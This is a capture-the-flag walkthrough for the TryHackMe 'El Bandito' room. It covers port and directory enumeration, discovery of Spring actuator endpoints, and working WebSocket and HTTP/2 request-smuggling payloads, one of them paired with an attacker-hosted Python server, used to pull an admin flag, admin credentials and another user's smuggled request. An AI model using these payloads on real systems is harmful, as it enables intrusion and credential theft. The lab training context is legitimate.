## THM CTF - El Bandito

Flags:

> Whats the first web flag?

> Whats the second web flag?

---

We can start changing local DNS to easily handle all the process.
```
sudo nano /etc/hosts
```
Add the record:
```
xxx.xxx.xxx.xxx	   bandito.thm
```
Now we can proceed with an ```Nmap``` scan.
```
sudo nmap -sS -T4 bandito.thm -p-
```
We discovered four open ports, and we can list the services they provide.
```
sudo nmap -sS -T4 bandito.thm -p22,80,631,8080 -sV
```
```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  ssl/http El Bandito Server
631/tcp  open  ipp      CUPS 2.4
8080/tcp open  http     nginx
```
We proceed with a ```Gobuster``` enumeration, but we encounter some challenges on ```port 80```. However, we managed to obtain some results on both ```port 80 (https)``` and ```port 8080 (http)```.

### Port 80
```
gobuster dir -u https://bandito.thm:80/ -w /usr/share/wordlists/dirb/common.txt -x html,js,txt,php,db,json,log -k
```
using ```-k``` to skip SSL certificate verification.

```
/access
/login
/logout
/messages
/ping
/save
/static
```

### Port 8080
```
gobuster dir -u http://bandito.thm:8080 -w /usr/share/wordlists/dirb/common.txt -x html,js,txt,php,db,json,log
```
```
/assets
/health
/info
/services.html
/token
```
Searching online, health and info are possibile indicators of a ```Spring Actuators```, suggesting this is a ```Spring app```.

We can try some actuators suggested by this page:

[Spring Actuators](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/spring-actuators.html)

```
/dump, /trace, /logfile, /shutdown, /mappings, /env, /actuator/env, /restart, and /heapdump
```
```/mappings``` is the winner, returning us with some important info.
```
/admin-creds
/admin-flag
/isOnline
```
Let's continue on ```port 8080``` for now.
```
http://bandito.thm:8080/
```
On ```port 8080``` there is an actual site.
```
service.html

http://bandito.websocket.thm: OFFLINE
http://bandito.public.thm: ONLINE
```
In this page there is an interesting JS code:
```
fetch(`/isOnline?url=${serviceUrl}
```
which can be used in an attack.
```
burn.html
```
This page seems the only way in for now, however when we try to execute an operation on the form, we receive an error in the console:
```
This service is not working on purpose ;) 
WebSocket is closed now
```
It might seems that we are on the right track and we need to hack a ```web socket```.

Let's setup an ```attacker's web server``` like we've seen in the previous lessons.

[Request Smuggling: WebSockets](https://tryhackme.com/room/wsrequestsmuggling)
```
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 1:
    print("""
Usage: {} 
    """.format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.protocol_version = "HTTP/1.1"
       self.send_response(101)
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```
We can open ```Burpsuite``` and craft a payload ***(remember to toggle Update Content-Length option and to leave the right amount of \r\n)***
```
GET /isOnline?url=http://10.11.123.90:5555 HTTP/1.1
Host: bandito.thm:8080
Sec-WebSocket-Version: 13
Upgrade: WebSocket
Connection: Upgrade

GET /admin-flag HTTP/1.1
Host: bandito.thm:8080


```
In the response we find the ```first flag```.

Now we can try the same approach with ```/admin-creds```.
```
GET /isOnline?url=http://10.11.123.90:5555 HTTP/1.1
Host: bandito.thm:8080
Sec-WebSocket-Version: 13
Upgrade: WebSocket
Connection: Upgrade

GET /admin-creds HTTP/1.1
Host: bandito.thm:8080


```
In the response we find some useful credentials that we can try on the page:
```
https://bandito.thm:80/access
```
We need to specify the port because there is an HTTPS connection on port 80 instead of the standard 443.

And we're in!

In the landing page we can find a chat.

Let's analyse the page. It seems that the only JS is:
```
/static/messages.js
```
In which we find:
```
/getMessages
/sendMessage
```
Now we can try to craft a payload with send message in ```Burpsuite``` following the instructions in the previous lessons ***(remember to toggle Update Content-Length option and to leave the right amount of \r\n)***

[HTTP/2 Request Smuggling](https://tryhackme.com/room/http2requestsmuggling)
```
POST / HTTP/2
Host: bandito.thm:80
Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z7HByQ.8SxkL235l7cHtvk1JocEEYU2aWk
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Content-Length: 0

POST /send_message HTTP/1.1
Host: bandito.thm:80
Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z7HByQ.8SxkL235l7cHtvk1JocEEYU2aWk
Content-Length: 900
Content-Type: application/x-www-form-urlencoded

data=




```
This payload might return a ```503 error``` because the event to smuggle the content hasn’t happened yet.
We need to resend the request until the ```/getMessages``` page displays the content we want to smuggle, aka the second flag!
